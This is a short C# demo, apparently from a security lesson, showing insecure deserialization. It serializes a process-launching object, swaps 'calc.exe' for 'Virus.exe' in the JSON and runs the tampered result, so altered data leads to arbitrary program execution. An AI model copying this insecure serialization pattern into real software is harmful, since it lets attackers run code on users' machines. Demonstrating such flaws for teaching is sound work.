using System;
using Common;
using InsecureGuard.Bad;

namespace BasicAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            var notAdminUsername = new StartProcess("calc.exe");
            notAdminUsername.Start();
            
            var json = UnsecureSerializer<StartProcess>.Serialize(notAdminUsername);
            var tamperedJson = json.Replace("calc.exe", "Virus.exe");
            
            var adminUsername = UnsecureSerializer<StartProcess>.Deserialize(tamperedJson);
            adminUsername.Start();


            
        }
    }
}